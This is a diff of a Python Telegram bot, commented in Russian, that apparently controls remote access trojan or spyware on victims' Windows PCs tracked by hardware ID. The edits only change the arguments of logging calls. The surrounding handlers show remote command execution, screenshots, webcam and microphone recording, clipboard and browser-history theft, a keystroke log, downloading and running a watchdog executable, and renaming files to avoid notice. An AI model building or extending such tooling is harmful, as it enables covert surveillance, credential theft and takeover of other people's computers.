@@ -232,7 +232,7 @@ def start_command(message):
 """
     
     bot.reply_to(message, welcome_text, parse_mode='HTML')
-    db.log_action(user_id, None, "start_command")
+    db.log_action(user_id, "start_command")
 
 @bot.message_handler(commands=['panel'])
 @command_handler
@@ -304,7 +304,7 @@ def panel_command(message):
 """
     
     bot.reply_to(message, text, reply_markup=markup, parse_mode='HTML')
-    db.log_action(user_id, None, "panel_command")
+    db.log_action(user_id, "panel_command")
 
 @bot.message_handler(commands=['pc_list'])
 @command_handler
@@ -391,7 +391,7 @@ def pc_list_command(message):
         text += f"   🐕 Watchdog: {status_icon} {real_status}\n\n"
     
     bot.reply_to(message, text, parse_mode='HTML')
-    db.log_action(user_id, None, "pc_list_command")
+    db.log_action(user_id, "pc_list_command")
 
 @bot.message_handler(commands=['info'])
 @command_handler
@@ -465,7 +465,7 @@ def info_command(message):
 """
     
     bot.reply_to(message, text, parse_mode='HTML')
-    db.log_action(user_id, target_hwid, "info_command")
+    db.log_action(user_id, "info_command")
 
 @bot.message_handler(commands=['screen'])
 @command_handler
@@ -496,7 +496,7 @@ def screen_command(message):
         import os
         os.remove(screenshot_path)
         
-        db.log_action(user_id, target_hwid, "screen_command")
+        db.log_action(user_id, "screen_command")
     except Exception as e:
         bot.reply_to(message, f"❌ Ошибка создания скриншота: {e}")
 
@@ -531,7 +531,7 @@ def active_command(message):
 """
         
         bot.reply_to(message, text, parse_mode='HTML')
-        db.log_action(user_id, target_hwid, "active_command")
+        db.log_action(user_id, "active_command")
     except Exception as e:
         bot.reply_to(message, f"❌ Ошибка получения активного окна: {e}")
 
@@ -619,7 +619,7 @@ def procs_command(message):
         )
         
         send_success_message(message.chat.id, "успешно ✅")
-        db.log_action(user_id, target_hwid, "procs_command")
+        db.log_action(user_id, "procs_command")
         
     except Exception as e:
         bot.reply_to(message, f"❌ Ошибка получения списка процессов: {e}")
@@ -738,7 +738,7 @@ def cmd_command(message):
             result = result[:4000] + "\n... (сообщение обрезано)"
         
         bot.reply_to(message, f"📋 Результат:\n```\n{result}\n```", parse_mode='Markdown')
-        db.log_action(user_id, target_hwid, f"cmd_command: {command[:50]}")
+        db.log_action(user_id, f"cmd_command: {command[:50]}")
     except Exception as e:
         bot.reply_to(message, f"❌ Ошибка выполнения команды: {e}")
 
@@ -803,7 +803,7 @@ def wd_download_command(message):
             bot.reply_to(message, f"✅ watchdog.exe успешно загружен!\n"
                                 f"📁 Размер: {file_size / 1024 / 1024:.2f} MB\n"
                                 f"📍 Путь: {watchdog_path}")
-            db.log_action(user_id, None, f"wd_download_command: {url[:50]}")
+            db.log_action(user_id, f"wd_download_command: {url[:50]}")
         else:
             bot.reply_to(message, "❌ Загруженный файл пуст или поврежден")
             os.remove(watchdog_path)
@@ -860,7 +860,7 @@ def wd_on_command(message):
         
         bot.reply_to(message, f"✅ watchdog.exe запущен (PID: {watchdog_process.pid})")
         db.update_watchdog_status(CURRENT_HWID, 'active')
-        db.log_action(user_id, None, "wd_on_command")
+        db.log_action(user_id, "wd_on_command")
         
     except Exception as e:
         bot.reply_to(message, f"❌ Ошибка запуска watchdog.exe: {e}")
@@ -894,7 +894,7 @@ def wd_off_command(message):
         
         bot.reply_to(message, "✅ watchdog.exe остановлен")
         db.update_watchdog_status(CURRENT_HWID, 'stopped')
-        db.log_action(user_id, None, "wd_off_command")
+        db.log_action(user_id, "wd_off_command")
         
     except Exception as e:
         bot.reply_to(message, f"❌ Ошибка остановки watchdog.exe: {e}")
@@ -934,7 +934,7 @@ def add_admin_command(message):
             username = f"user_{new_admin_id}"  # Будет обновлено при первом использовании
             if db.add_admin(new_admin_id, username, role):
                 bot.reply_to(message, f"✅ Администратор добавлен:\nID: {new_admin_id}\nРоль: {role}")
-                db.log_action(user_id, None, "add_admin", f"Added admin {new_admin_id} with role {role}")
+                db.log_action(user_id, "add_admin", f"Added admin {new_admin_id} with role {role}")
             else:
                 bot.reply_to(message, "❌ Ошибка добавления администратора.")
         except ValueError:
@@ -975,7 +975,7 @@ def del_admin_command(message):
         
         if db.remove_admin(admin_id_to_delete):
             bot.reply_to(message, f"✅ Администратор {admin_id_to_delete} удален.")
-            db.log_action(user_id, None, "del_admin", f"Deleted admin {admin_id_to_delete}")
+            db.log_action(user_id, "del_admin", f"Deleted admin {admin_id_to_delete}")
         else:
             bot.reply_to(message, "❌ Ошибка удаления администратора.")
     except ValueError:
@@ -1015,7 +1015,7 @@ def admin_list_command(message):
         text += f"   Добавлен: {created_at}\n\n"
     
     bot.reply_to(message, text, parse_mode='HTML')
-    db.log_action(user_id, None, "admin_list_command")
+    db.log_action(user_id, "admin_list_command")
 
 # --- НОВЫЕ КОМАНДЫ МУЛЬТИМЕДИА И МОНИТОРИНГА ---
 
@@ -1076,7 +1076,7 @@ def webcam_command(message):
         os.remove(filepath)
         
         send_success_message(message.chat.id, "успешно ✅")
-        db.log_action(user_id, target_hwid, "webcam_command", details=f"delay={delay}")
+        db.log_action(user_id, "webcam_command", f"delay={delay}")
         
     except Exception as e:
         bot.reply_to(message, f"❌ Ошибка захвата веб-камеры: {e}")
@@ -1132,7 +1132,7 @@ def mic_command(message):
         os.remove(filepath)
         
         send_success_message(message.chat.id, "успешно ✅")
-        db.log_action(user_id, target_hwid, "mic_command", details=f"duration={duration}")
+        db.log_action(user_id, "mic_command", f"duration={duration}")
         
     except Exception as e:
         bot.reply_to(message, f"❌ Ошибка записи с микрофона: {e}")
@@ -1171,7 +1171,7 @@ def clipboard_command(message):
         
         bot.reply_to(message, text, parse_mode='HTML')
         send_success_message(message.chat.id, "успешно ✅")
-        db.log_action(user_id, target_hwid, "clipboard_command")
+        db.log_action(user_id, "clipboard_command")
         
     except Exception as e:
         bot.reply_to(message, f"❌ Ошибка получения буфера обмена: {e}")
@@ -1303,7 +1303,7 @@ def history_command(message):
         report += f"• Файл: {filename}"
         
         send_success_message(message.chat.id, report)
-        db.log_action(user_id, target_hwid, "history_command", details=f"Browsers: {len(successful_browsers)}/{len(browsers)}")
+        db.log_action(user_id, "history_command", f"Browsers: {len(successful_browsers)}/{len(browsers)}")
         
     except Exception as e:
         bot.reply_to(message, f"❌ Ошибка получения истории браузера: {e}")
@@ -1359,7 +1359,7 @@ def app_list_command(message):
         )
         
         send_success_message(message.chat.id, "успешно ✅")
-        db.log_action(user_id, target_hwid, "app_list_command")
+        db.log_action(user_id, "app_list_command")
         
     except Exception as e:
         bot.reply_to(message, f"❌ Ошибка получения списка приложений: {e}")
@@ -1397,7 +1397,7 @@ def full_scan_command(message):
         bot.reply_to(message, scan_result, parse_mode='HTML')
         
         send_success_message(message.chat.id, "успешно ✅")
-        db.log_action(user_id, target_hwid, "full_scan_command")
+        db.log_action(user_id, "full_scan_command")
         
     except Exception as e:
         bot.reply_to(message, f"❌ Ошибка при сканировании системы: {e}")
@@ -1435,7 +1435,7 @@ def deep_scan_command(message):
         bot.reply_to(message, scan_result, parse_mode='HTML')
         
         send_success_message(message.chat.id, "успешно ✅")
-        db.log_action(user_id, target_hwid, "deep_scan_command")
+        db.log_action(user_id, "deep_scan_command")
         
     except Exception as e:
         bot.reply_to(message, f"❌ Ошибка при глубоком сканировании системы: {e}")
@@ -1547,7 +1547,7 @@ def keyboard_command(message):
         except Exception as clear_error:
             bot.send_message(message.chat.id, f"✅ Лог отправлен, но ошибка при очистке: {clear_error}")
         
-        db.log_action(user_id, target_hwid, "keyboard_command")
+        db.log_action(user_id, "keyboard_command")
         
     except Exception as e:
         bot.reply_to(message, f"❌ Ошибка при получении лога клавиатуры: {e}")
@@ -1586,7 +1586,7 @@ def urs_update_command(message):
         if success:
             bot.reply_to(message, f"✅ {result}")
             send_success_message(message.chat.id, "успешно ✅")
-            db.log_action(user_id, None, "urs_update_command", details=f"URL: {url[:50]}")
+            db.log_action(user_id, "urs_update_command", f"URL: {url[:50]}")
         else:
             bot.reply_to(message, f"❌ {result}")
             
@@ -1649,7 +1649,7 @@ def rename_bot_command(message):
         thread = threading.Thread(target=exit_after_delay, daemon=True)
         thread.start()
         
-        db.log_action(user_id, None, "rename_bot", details=f"New name: {new_name}")
+        db.log_action(user_id, "rename_bot", f"New name: {new_name}")
         
     except Exception as e:
         bot.reply_to(message, f"❌ Ошибка при переименовании: {str(e)}")
@@ -1703,7 +1703,7 @@ def rename_watchdog_command(message):
         os.rename(watchdog_path, new_path)
         
         bot.reply_to(message, f"✅ Watchdog переименован в <code>{new_name}</code>", parse_mode='HTML')
-        db.log_action(user_id, None, "rename_watchdog", details=f"New name: {new_name}")
+        db.log_action(user_id, "rename_watchdog", f"New name: {new_name}")
         
     except Exception as e:
         bot.reply_to(message, f"❌ Ошибка при переименовании watchdog: {str(e)}")
@@ -1745,7 +1745,7 @@ def rename_pc_command(message):
         db.conn.commit()
         
         bot.reply_to(message, f"✅ Имя устройства изменено на: <b>{new_name}</b>", parse_mode='HTML')
-        db.log_action(user_id, None, "rename_pc", details=f"New name: {new_name}")
+        db.log_action(user_id, "rename_pc", f"New name: {new_name}")
         
     except Exception as e:
         bot.reply_to(message, f"❌ Ошибка при изменении имени устройства: {str(e)}")
@@ -1906,7 +1906,7 @@ public class Audio {{
                 except ValueError:
                     bot.reply_to(message, "❌ Неверный формат уровня громкости. Используйте число от 0 до 100")
         
-        db.log_action(user_id, target_hwid, "volume_command", details=f"Volume: {volume_arg}")
+        db.log_action(user_id, "volume_command", f"Volume: {volume_arg}")
         
     except Exception as e:
         bot.reply_to(message, f"❌ Ошибка при установке громкости: {str(e)}")
@@ -1943,7 +1943,7 @@ def uninstall_command(message):
     confirmation_msg = get_confirmation_full_message('uninstall', confirmation_step='first')
     bot.reply_to(message, confirmation_msg, parse_mode='HTML')
     
-    db.log_action(user_id, target_hwid, "uninstall_command", details="Started double confirmation flow")
+    db.log_action(user_id, "uninstall_command", "Started double confirmation flow")
 
 # --- КОМАНДА ДЛЯ ОЧИСТКИ БАЗЫ ДАННЫХ ---
 
@@ -1979,7 +1979,7 @@ def cleanup_db_command(message):
 """
         
         bot.reply_to(message, report, parse_mode='HTML')
-        db.log_action(user_id, None, "cleanup_db_command", details=f"Stats: {stats}")
+        db.log_action(user_id, "cleanup_db_command", f"Stats: {stats}")
         
     except Exception as e:
         bot.reply_to(message, f"❌ Ошибка при очистке базы данных: {str(e)}")
@@ -2052,7 +2052,7 @@ def commands_command(message):
 """
     
     bot.reply_to(message, commands_text, parse_mode='HTML')
-    db.log_action(user_id, None, "commands_command")
+    db.log_action(user_id, "commands_command")
 
 # --- КОМАНДА ДЛЯ ДОБАВЛЕНИЯ СЕБЯ КАК АДМИНИСТРАТОРА ---
 # Удалена команда /addme, так как она больше не нужна
@@ -2100,7 +2100,7 @@ def text_message_handler(message):
             bot.reply_to(message, response, parse_mode='HTML')
             
             # Логируем действие
-            db.log_action(user_id, target_hwid, "execute_cmd", f"Command: {text[:50]}")
+            db.log_action(user_id, "execute_cmd", f"Command: {text[:50]}")
             
             # Очищаем состояние
             clear_user_state(user_id)
@@ -2144,7 +2144,7 @@ def text_message_handler(message):
             username = f"user_{new_admin_id}"  # Будет обновлено при первом использовании
             if db.add_admin(new_admin_id, username, role):
                 bot.reply_to(message, f"✅ Администратор добавлен:\nID: {new_admin_id}\nРоль: {role}")
-                db.log_action(user_id, None, "add_admin", f"Added admin {new_admin_id} with role {role}")
+                db.log_action(user_id, "add_admin", f"Added admin {new_admin_id} with role {role}")
             else:
                 bot.reply_to(message, "❌ Ошибка добавления администратора.")
             
